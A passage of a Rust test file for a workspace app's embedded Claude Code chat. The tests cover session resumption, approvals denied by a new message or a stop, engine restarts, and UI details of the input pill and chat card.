    let gone = r#"{"type":"result","subtype":"error_during_execution","duration_ms":0,"is_error":true,"num_turns":0,"session_id":"old-1","total_cost_usd":0,"errors":["No conversation found with session ID: old-1"]}"#;
    let (exit, start) = (::templum_agent::fake::EXIT, ::templum_agent::fake::START);
    let script = format!("{gone}\n{exit}\n{start}{TEXT_TURN}");
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[&script]);
    ws.update(cx, |ws, _| {
        ws.templum_agent.conversation.session = Some("old-1".into());
        ws.templum_agent.conversation.spent = 2.0;
    });
    send(handle, &ws, cx, "hi");
    let rows = rows_until(&ws, cx, ended);
    assert!(
        rows.contains(&::templum_agent::Row::Note {
            text: "The old session is gone; a new one started.".into()
        }),
        "{rows:#?}"
    );
    assert!(
        !rows
            .iter()
            .any(|r| matches!(r, ::templum_agent::Row::Failure { .. })),
        "{rows:#?}"
    );
    ws.read_with(cx, |ws, _| {
        let agent = &ws.templum_agent;
        assert_eq!(agent.launched.len(), 2);
        assert!(
            agent.launched[0]
                .windows(2)
                .any(|w| w == ["--resume", "old-1"])
        );
        assert!(agent.launched[1].iter().any(|w| w == "--session-id"));
        assert_eq!(agent.sent, ["hi", "hi"], "the new one is given the message");
        assert_ne!(agent.conversation.session.as_deref(), Some("old-1"));
        assert!(
            agent.conversation.cost() > 0.0,
            "its turn's cost counts from 0"
        );
    });
}

#[gpui_kit::test]
fn the_conversation_comes_back_after_a_restart(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    send(handle, &ws, cx, "hi");
    let rows = rows_until(&ws, cx, ended);
    let (handle, again) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    again.read_with(cx, |ws, _| {
        assert_eq!(ws.templum_agent.conversation.rows, rows);
        assert!(ws.templum_agent.conversation.session.is_some());
    });
    send(handle, &again, cx, "more");
    again.read_with(cx, |ws, _| {
        let words = &ws.templum_agent.launched[0];
        assert!(
            words
                .windows(2)
                .any(|w| w == ["--resume", "d6441644-97b6-457b-a90e-ad9cf0b00e34"]),
            "{words:?}"
        );
    });
}

#[gpui_kit::test]
fn a_message_while_an_approval_waits_denies_it_with_the_message(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    send(handle, &ws, cx, "keep it open");
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(
        failed && text.ends_with("They said: keep it open"),
        "{text}"
    );
    let rows = rows_until(&ws, cx, ended);
    assert!(
        rows.iter().any(
            |r| matches!(r, ::templum_agent::Row::Person { text, .. } if text == "keep it open")
        )
    );
}

#[gpui_kit::test]
fn the_engine_ending_mid_turn_fails_the_turn_and_denies_what_waits(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let init = TEXT_TURN.lines().next().unwrap();
    let tool = r#"{"type":"stream_event","event":{"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"t1","name":"mcp__templum-control__add_block","input":{}}}}"#;
    let crash = format!("{init}\n{tool}\n{}\n", ::templum_agent::fake::EXIT);
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[&crash]);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    send(handle, &ws, cx, "go");
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    let rows = rows_until(&ws, cx, |rows| {
        rows.iter()
            .any(|r| matches!(r, ::templum_agent::Row::Failure { .. }))
    });
    let Some(::templum_agent::Row::Failure { text }) = rows.last() else {
        panic!("{rows:#?}")
    };
    assert!(
        text.starts_with("Claude Code stopped: ")
            && text.ends_with(". Your next message starts it again."),
        "{text}"
    );
    assert!(matches!(
        &rows[1],
        ::templum_agent::Row::Action {
            state: ::templum_agent::ActionState::Failed,
            ..
        }
    ));
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!(
        (failed, text.as_str()),
        (true, "The person stopped you before answering.")
    );
    ws.read_with(cx, |ws, _| {
        assert!(ws.templum_agent.engine.is_none());
        assert!(!ws.templum_agent.conversation.working);
    });
}

#[gpui_kit::test]
fn new_chat_forgets_the_session_grants_and_own_things(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    send(handle, &ws, cx, "hi");
    rows_until(&ws, cx, ended);
    ws.update(cx, |ws, cx| {
        ws.templum_agent.grants.insert("send_to_terminal".into());
        ws.templum_agent.conversation.own.blocks.push("b1".into());
        ws.new_chat(cx);
        let agent = &ws.templum_agent;
        assert!(agent.engine.is_none() && agent.grants.is_empty());
        assert_eq!(agent.conversation.session, None);
        assert_eq!(agent.conversation.own, ::templum_agent::Own::default());
        assert_eq!(
            agent.conversation.rows,
            [::templum_agent::Row::Note {
                text: "New conversation.".into()
            }]
        );
    });
    let saved =
        std::fs::read_to_string(dir.path().join("agent").join("conversation.json")).unwrap();
    assert!(
        saved.contains("New conversation.") && !saved.contains("Hello"),
        "{saved}"
    );
}

#[gpui_kit::test]
fn a_settings_change_restarts_an_idle_engine(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN, TEXT_TURN]);
    send(handle, &ws, cx, "hi");
    rows_until(&ws, cx, ended);
    ws.update(cx, |ws, cx| {
        ws.edit(
            Edit::set("templum_agent", "model", "opus"),
            |c| c.templum_agent.model = "opus".into(),
            cx,
        )
    });
    frame(handle, cx);
    assert!(
        ws.read_with(cx, |ws, _| ws.templum_agent.engine.is_none()),
        "an idle engine stops"
    );
    send(handle, &ws, cx, "again");
    ws.read_with(cx, |ws, _| {
        let words = ws.templum_agent.launched.last().unwrap();
        assert!(
            words.windows(2).any(|w| w == ["--model", "opus"]),
            "{words:?}"
        );
        assert!(words.iter().any(|w| w == "--resume"), "{words:?}");
    });
}

/// A turn that starts writing and never ends by itself.
fn endless_turn() -> String {
    let init = TEXT_TURN.lines().next().unwrap();
    let delta = r#"{"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Counting"}}}"#;
    format!("{init}\n{delta}\n")
}

#[gpui_kit::test]
fn stop_interrupts_the_turn_keeps_the_process_and_denies_what_waits(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    // The interrupt is the next line the fake reads: its turn is the interrupted turn's end.
    let stopped =
        r#"{"type":"result","subtype":"error_during_execution","is_error":true,"duration_ms":5}"#;
    let (handle, ws) =
        with_fake_engine(cx, dir.path(), &[&endless_turn(), &format!("{stopped}\n")]);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    send(handle, &ws, cx, "count");
    rows_until(&ws, cx, |rows| {
        rows.iter()
            .any(|r| matches!(r, ::templum_agent::Row::Text { .. }))
    });
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    ws.update(cx, |ws, cx| ws.stop_engine(cx));
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!(
        (failed, text.as_str()),
        (true, "The person stopped you before answering.")
    );
    let rows = rows_until(&ws, cx, ended);
    use ::templum_agent::Row;
    assert_eq!(
        rows.last(),
        Some(&Row::Note {
            text: "Stopped by you.".into()
        }),
        "{rows:#?}"
    );
    assert!(
        !rows.iter().any(|r| matches!(r, Row::Failure { .. })),
        "{rows:#?}"
    );
    ws.read_with(cx, |ws, _| {
        assert!(ws.templum_agent.engine.is_some(), "the process stays");
        assert!(!ws.templum_agent.conversation.working);
    });
}

#[gpui_kit::test]
fn a_turn_that_wont_stop_has_its_process_ended(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[&endless_turn()]);
    send(handle, &ws, cx, "count");
    rows_until(&ws, cx, |rows| {
        rows.iter()
            .any(|r| matches!(r, ::templum_agent::Row::Text { .. }))
    });
    ws.update(cx, |ws, cx| ws.stop_engine(cx));
    super::bus::after(cx, 2_000);
    ws.read_with(cx, |ws, _| {
        let agent = &ws.templum_agent;
        assert!(agent.engine.is_none(), "ended");
        assert_eq!(
            agent.conversation.rows.last(),
            Some(&::templum_agent::Row::Note {
                text: "Stopped by you.".into()
            })
        );
    });
}

#[cfg(target_os = "macos")]
const AGENT: &str = "cmd-shift-space";
#[cfg(not(target_os = "macos"))]
const AGENT: &str = "ctrl-shift-space";

/// Whether the pill's field has the keyboard.
fn pill_has_keys(handle: AnyWindowHandle, ws: &Entity<Workspace>, cx: &mut TestAppContext) -> bool {
    cx.update_window(handle, |_, window, cx| {
        ws.read(cx)
            .templum_agent
            .input
            .as_ref()
            .is_some_and(|i| gpui_kit::Focusable::focus_handle(i.read(cx), cx).is_focused(window))
    })
    .unwrap()
}

fn pill_text(ws: &Entity<Workspace>, cx: &mut TestAppContext) -> String {
    ws.read_with(cx, |ws, cx| {
        ws.templum_agent
            .input
            .as_ref()
            .map(|i| i.read(cx).value().to_string())
            .unwrap_or_default()
    })
}

#[gpui_kit::test]
fn the_shortcut_takes_the_keyboard_and_esc_gives_it_back(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let first = first_id(&ws, cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.focus_block(first, window, cx));
        window.render_frame(cx);
        window.press(AGENT, cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        pill_has_keys(handle, &ws, cx),
        "the pill takes the keyboard"
    );
    cx.update_window(handle, |_, window, cx| window.input("ls", cx))
        .unwrap();
    assert_eq!(
        pill_text(&ws, cx),
        "ls",
        "the keys go to the pill, not the terminal"
    );
    cx.update_window(handle, |_, window, cx| {
        window.press("escape", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(!pill_has_keys(handle, &ws, cx));
    cx.update_window(handle, |_, window, cx| {
        let ws = ws.read(cx);
        assert_eq!(ws.space.focused, Some(first));
        assert!(
            ws.focus_handle.is_focused(window),
            "the terminal has the keyboard again"
        );
    })
    .unwrap();
    assert_eq!(pill_text(&ws, cx), "ls", "the text stays");
    // The shortcut again, while the pill has the keyboard, gives it back too.
    cx.update_window(handle, |_, window, cx| {
        window.press(AGENT, cx);
        window.render_frame(cx);
        window.press(AGENT, cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(!pill_has_keys(handle, &ws, cx));
}

#[gpui_kit::test]
fn enter_sends_and_shift_enter_is_a_new_line(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.press(AGENT, cx);
        window.render_frame(cx);
        window.input("hi", cx);
        window.press("shift-enter", cx);
        window.input("there", cx);
        window.press("enter", cx);
        window.render_frame(cx);
    })
    .unwrap();
    let rows = rows_until(&ws, cx, ended);
    assert_eq!(
        rows[0],
        ::templum_agent::Row::Person {
            text: "hi\nthere".into(),
            queued: false
        }
    );
    assert_eq!(pill_text(&ws, cx), "", "the field is cleared");
    assert!(
        ws.read_with(cx, |ws, _| ws.templum_agent.open),
        "sending opens the chat"
    );
}

#[gpui_kit::test]
fn the_pill_is_hidden_when_turned_off(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-pill").is_some(), "shown by default");
    })
    .unwrap();
    ws.update(cx, |ws, cx| {
        ws.edit(
            Edit::set("templum_agent", "pill", false),
            |c| c.templum_agent.pill = false,
            cx,
        )
    });
    frame(handle, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-pill").is_none());
        window.press(AGENT, cx);
        window.render_frame(cx);
        assert!(
            window.try_find("agent-pill").is_some(),
            "the shortcut opens it"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn not_installed_says_so(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| ws.templum_agent.installed = false);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-missing").is_some());
        assert_eq!(
            crate::chat::pill::rest(ws.read(cx)),
            "Claude Code isn't installed"
        );
        window.click("agent-pill", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(panel_open(&ws, cx), "a click opens Settings");
    ws.update(cx, |ws, _| ws.templum_agent.installed = true);
    assert_eq!(
        ws.read_with(cx, |ws, _| crate::chat::pill::rest(ws)),
        "Ask Templum"
    );
}

#[gpui_kit::test]
fn the_pill_says_what_it_does_what_it_asks_and_that_something_is_new(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("go");
        c.apply(::templum_agent::ChatEvent::ToolStarted {
            id: "t1".into(),
            name: "mcp__templum-control__open_agent".into(),
        });
        ws.templum_agent.unread = true;
    });
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-working").is_some());
        assert!(window.try_find("agent-unread").is_some(), "something new");
        assert_eq!(crate::chat::pill::doing(ws.read(cx)), "Opening an agent…");
    })
    .unwrap();
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let _answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(
            window.try_find("agent-asks").is_some(),
            "it asks, over its work"
        );
        window.click("agent-review", cx);
        window.render_frame(cx);
    })
    .unwrap();
    cx.update_window(handle, |_, window, cx| {
        let ws = ws.read(cx);
        let focus = ws.templum_agent.approval_focus.as_ref().unwrap();
        assert!(focus.is_focused(window), "the approval has the keyboard");
    })
    .unwrap();
    ws.read_with(cx, |ws, _| {
        assert!(ws.templum_agent.open && !ws.templum_agent.unread)
    });
}

fn open_chat(handle: AnyWindowHandle, ws: &Entity<Workspace>, cx: &mut TestAppContext) {
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| {
            if !ws.agent_has_keys(window, cx) {
                ws.toggle_agent(window, cx);
            }
            ws.templum_agent.open = true;
        });
        window.render_frame(cx);
    })
    .unwrap();
}

#[gpui_kit::test]
fn a_turn_shows_its_rows(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    send(handle, &ws, cx, "hi");
    let rows = rows_until(&ws, cx, ended);
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-chat").is_some());
        for n in 0..rows.len() {
            assert!(
                window.try_find(format!("agent-row-{n}")).is_some(),
                "row {n}"
            );
        }
        assert!(
            window
                .try_find(format!("agent-row-{}", rows.len()))
                .is_none()
        );
        assert!(
            window.try_find("agent-pill").is_some(),
            "the pill is its footer"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn a_long_chat_draws_only_the_rows_in_view(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        for i in 0..2000 {
            c.person(&format!("message {i}"));
            c.apply(::templum_agent::ChatEvent::Text(format!("answer {i}")));
        }
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(
            window.try_find("agent-row-3999").is_some(),
            "its end is shown"
        );
        assert!(
            window.try_find("agent-row-0").is_none(),
            "its start isn't drawn"
        );
    })
    .unwrap();
    // A new row shows at its end.
    ws.update(cx, |ws, _| ws.templum_agent.conversation.note("New one."));
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-row-4000").is_some());
    })
    .unwrap();
}

#[gpui_kit::test]
fn the_text_it_writes_is_markdown_once_whole(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("hi");
        c.apply(::templum_agent::ChatEvent::TextDelta("**Hel".into()));
        c.apply(::templum_agent::ChatEvent::TextDelta("lo**".into()));
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, _| {
        assert!(
            window.try_find("agent-streaming").is_some(),
            "plain while it grows"
        );
    })
    .unwrap();
    ws.update(cx, |ws, _| {
        let whole = ::templum_agent::ChatEvent::Text("**Hello**".into());
        ws.templum_agent.conversation.apply(whole);
    });
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(
            window.try_find("agent-streaming").is_none(),
            "Markdown once whole"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn a_rows_click_reveals_its_block_in_another_workspace(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    control(handle, &ws, cx, "create_workspace", json!({"name": "API"}));
    let input = json!({"workspace": "w2", "kind": "note", "text": "plan"});
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("a note");
        c.apply(::templum_agent::ChatEvent::ToolStarted {
            id: "t1".into(),
            name: "mcp__templum-control__add_block".into(),
        });
        c.apply(::templum_agent::ChatEvent::ToolCall {
            id: "t1".into(),
            name: "mcp__templum-control__add_block".into(),
            input: input.clone(),
        });
    });
    let (_, text) = control(handle, &ws, cx, "add_block", input);
    let note = id_in(&text);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.apply(::templum_agent::ChatEvent::ToolResult {
            id: "t1".into(),
            text,
            is_error: false,
        });
        c.apply(::templum_agent::ChatEvent::TurnEnded {
            ms: None,
            cost_usd: None,
            error: None,
        });
    });
    assert_ne!(
        ws.read_with(cx, |ws, _| ws.space.id.clone()),
        "w2",
        "not shown yet"
    );
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-row-1", cx);
        window.render_frame(cx);
    })
    .unwrap();
    ws.read_with(cx, |ws, _| {
        assert_eq!(ws.space.id, "w2");
        assert_eq!(ws.space.focused, ws.space.block_by_uid(&note));
    });
}

#[gpui_kit::test]
fn new_chat_and_stop_buttons(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| ws.templum_agent.conversation.person("go"));
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        assert!(window.try_find("agent-stop").is_some(), "while it works");
        window.click("agent-new", cx);
        window.render_frame(cx);
        assert!(window.try_find("agent-stop").is_none());
    })
    .unwrap();
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.templum_agent.conversation.rows.clone()),
        [::templum_agent::Row::Note {
            text: "New conversation.".into()
        }]
    );
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-close", cx);
        window.render_frame(cx);
        assert!(window.try_find("agent-chat").is_none());
    })
    .unwrap();
}

/// Types `text` in the pill's field (made by the shortcut), as the person would.
fn set_pill(handle: AnyWindowHandle, ws: &Entity<Workspace>, cx: &mut TestAppContext, text: &str) {
    cx.update_window(handle, |_, window, cx| {
        let input = ws
            .read(cx)
            .templum_agent
            .input
            .clone()
            .expect("the field was made");
        input.update(cx, |input, cx| {
            input.set_value(text.to_string(), window, cx)
        });
    })
    .unwrap();
}

/// Resizes the window to `w` × `h`.
fn resize(handle: AnyWindowHandle, cx: &mut TestAppContext, w: f32, h: f32) {
    gpui_kit::VisualTestContext::from_window(handle, cx).simulate_resize(size(px(w), px(h)));
}

#[gpui_kit::test]
fn send_becomes_stop_while_it_works(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    let has = |cx: &mut TestAppContext, id: &'static str| {
        cx.update_window(handle, |_, window, cx| {
            window.render_frame(cx);
            window.try_find(id).is_some()
        })
        .unwrap()
    };
    assert!(
        has(cx, "agent-send") && !has(cx, "agent-stop"),
        "idle: Send, dim while empty"
    );
    assert!(
        !has(cx, "agent-hint"),
        "no line telling the keys while it has the keyboard"
    );
    ws.update(cx, |ws, _| ws.templum_agent.conversation.person("go"));
    assert!(
        has(cx, "agent-stop") && !has(cx, "agent-send"),
        "working, nothing typed: Stop"
    );
    set_pill(handle, &ws, cx, "and then");
    assert!(
        has(cx, "agent-stop") && has(cx, "agent-send"),
        "working with text: Send beside Stop"
    );
}

#[gpui_kit::test]
fn an_empty_send_does_nothing(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.click("agent-send", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.conversation.rows.is_empty()));
}

#[gpui_kit::test]
fn the_model_chip_sits_in_the_composer(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let pill = window.find("agent-pill").bounds();
        assert!(pill.contains(&window.find("agent-model").bounds().center()));
        assert!(
            window.try_find("agent-engine").is_none(),
            "the old engine label is gone"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn the_composer_grows_to_eight_lines_then_scrolls(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    let height = |cx: &mut TestAppContext, lines: usize| {
        let text: Vec<String> = (0..lines).map(|i| format!("line {i}")).collect();
        set_pill(handle, &ws, cx, &text.join("\n"));
        cx.update_window(handle, |_, window, cx| {
            window.render_frame(cx);
            window.render_frame(cx);
            f32::from(window.find("agent-pill").bounds().size.height)
        })
        .unwrap()
    };
    let (one, three, eight, twenty) = (height(cx, 1), height(cx, 3), height(cx, 8), height(cx, 20));
    assert!(one > 36.0 + 28.0, "the field and its bar: {one}");
    assert!(three > one && eight > three, "{one} {three} {eight}");
    assert_eq!(twenty, eight, "at most 8 lines, then it scrolls");
}

#[gpui_kit::test]
fn a_narrow_canvas_keeps_the_composer_inside_itself(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    resize(handle, cx, 420.0, 700.0);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    set_pill(handle, &ws, cx, "hello");
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let pill = window.find("agent-pill").bounds();
        let (chip, send) = (
            window.find("agent-model").bounds(),
            window.find("agent-send").bounds(),
        );
        assert!(chip.right() <= send.left(), "in order");
        assert!(send.right() <= pill.right() && chip.left() >= pill.left());
    })
    .unwrap();
}

#[gpui_kit::test]
fn the_usage_chip_is_a_label_without_tasks(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("go");
        c.apply(::templum_agent::ChatEvent::TurnEnded {
            ms: None,
            cost_usd: Some(0.04),
            error: None,
        });
        c.working = false;
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-meter", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(!ws.read_with(cx, |ws, _| ws.templum_agent.tasks_open));
}

#[gpui_kit::test]
fn a_code_blocks_copy_button_copies_its_code(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("hi");
        c.apply(::templum_agent::ChatEvent::Text(
            "Run:\n\n```bash\ncargo test\n```".into(),
        ));
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.render_frame(cx);
        window.click("agent-copy", cx);
    })
    .unwrap();
    let copied = cx.read_from_clipboard().and_then(|c| c.text());
    assert_eq!(copied.as_deref().map(str::trim_end), Some("cargo test"));
}

#[gpui_kit::test]
fn a_long_word_breaks_inside_its_bubble(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        ws.templum_agent.conversation.person(&"x".repeat(400))
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let row = window.find("agent-row-0").bounds();
        let bubble = window.find("agent-bubble-0").bounds();
        assert!(bubble.size.width <= row.size.width * 0.8 + gpui_kit::px(0.5));
        assert!(
            f32::from(bubble.size.height) > 2.0 * 22.0,
            "it wrapped: {:?}",
            bubble.size
        );
    })
    .unwrap();
}

fn action(said: &str) -> ::templum_agent::Row {
    ::templum_agent::Row::Action {
        id: "t1".into(),
        tool: "open_agent".into(),
        input: json!({"agent": "codex"}),
        state: ::templum_agent::ActionState::Done,
        said: said.into(),
        target: None,
    }
}

#[gpui_kit::test]
fn a_tool_row_opens_to_show_its_call(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let rows = &mut ws.templum_agent.conversation.rows;
        rows.push(action("Opened Codex as b1 in ~/proj."));
        rows.push(::templum_agent::Row::Note {
            text: "after".into(),
        });
    });
    open_chat(handle, &ws, cx);
    let click = |cx: &mut TestAppContext, id: &'static str| {
        cx.update_window(handle, |_, window, cx| {
            window.click(id, cx);
            window.render_frame(cx);
            window.render_frame(cx);
        })
        .unwrap()
    };
    let open_row = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, _| {
            window.try_find("agent-row-0-call").is_some()
        })
        .unwrap()
    };
    assert!(!open_row(cx));
    click(cx, "agent-row-0-more");
    assert!(open_row(cx));
    cx.update_window(handle, |_, window, _| {
        let (row, below) = (
            window.find("agent-row-0").bounds(),
            window.find("agent-row-1").bounds(),
        );
        assert!(
            below.top() >= row.bottom(),
            "the row under it moved: {row:?} {below:?}"
        );
    })
    .unwrap();
    click(cx, "agent-row-0-more");
    assert!(!open_row(cx));
    click(cx, "agent-row-0");
    assert!(open_row(cx), "a row that touched nothing opens on a click");
}

#[gpui_kit::test]
fn an_open_rows_fade_is_dated_by_the_click_that_opened_it(cx: &mut TestAppContext) {
    let (_, ws) = open(cx);
    ws.update(cx, |ws, _| {
        ws.templum_agent
            .conversation
            .rows
            .push(action("Opened Codex."))
    });
    let toggle = |cx: &mut TestAppContext| {
        ws.update(cx, |ws, cx| {
            ws.toggle_row(0, cx);
            (
                cx.background_executor().now(),
                ws.templum_agent.expanded.get(&0).copied(),
            )
        })
    };
    let (now, at) = toggle(cx);
    assert_eq!(at, Some(now), "opened now");
    assert_eq!(toggle(cx).1, None, "closed");
    cx.executor()
        .advance_clock(std::time::Duration::from_secs(5));
    let (later, at) = toggle(cx);
    assert!(later > now);
    assert_eq!(at, Some(later), "opened again: dated again");
}

#[gpui_kit::test]
fn new_chat_closes_every_open_row(cx: &mut TestAppContext) {
    let (_, ws) = open(cx);
    ws.update(cx, |ws, cx| {
        ws.templum_agent
            .conversation
            .rows
            .push(action("Opened Codex."));
        ws.toggle_row(0, cx);
        ws.new_chat(cx);
    });
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.expanded.is_empty()));
}

#[gpui_kit::test]
fn a_long_sentence_stays_on_one_line(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        ws.templum_agent
            .conversation
            .rows
            .push(action(&"x".repeat(300)))
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(f32::from(window.find("agent-row-0").bounds().size.height) <= 28.5);
    })
    .unwrap();
}

/// The open card's height and the canvas's, after `frames` frames.
fn card_height(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    frames: usize,
) -> (f32, f32) {
    cx.update_window(handle, |_, window, cx| {
        for _ in 0..frames {
            window.render_frame(cx);
        }
        let vp = ws.read(cx).viewport(window);
        (
            f32::from(window.find("agent-chat").bounds().size.height),
            vp.h,
        )
    })
    .unwrap()
}

#[gpui_kit::test]
fn the_card_is_as_tall_as_its_rows_up_to_its_cap(cx: &mut TestAppContext) {
    let notes = |ws: &Entity<Workspace>, cx: &mut TestAppContext, n: usize| {
        ws.update(cx, |ws, _| {
            for i in 0..n {
                ws.templum_agent.conversation.note(&format!("note {i}"));
            }
        })
    };
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| ws.templum_agent.conversation.person("go"));
    open_chat(handle, &ws, cx);
    assert_eq!(
        card_height(handle, &ws, cx, 3).0,
        300.0,
        "one row: its least"
    );
    notes(&ws, cx, 12);
    let (h, _) = card_height(handle, &ws, cx, 3);
    assert!(h > 300.0, "twelve more rows: {h}");
    notes(&ws, cx, 400);
    let (h, canvas) = card_height(handle, &ws, cx, 4);
    assert!(
        (h - canvas * 0.7).abs() <= 1.0,
        "a long chat: {h} of {canvas}"
    );
    assert_eq!(card_height(handle, &ws, cx, 3).0, h, "and it stays there");
}

#[gpui_kit::test]
fn stop_and_the_model_chip_stay_in_the_open_chat_without_the_keyboard(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| ws.templum_agent.conversation.person("go"));
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.blur(cx);
        window.render_frame(cx);
        let pill = window.find("agent-pill").bounds();
        assert!(
            window.try_find("agent-stop").is_some(),
            "Stop while it works"
        );
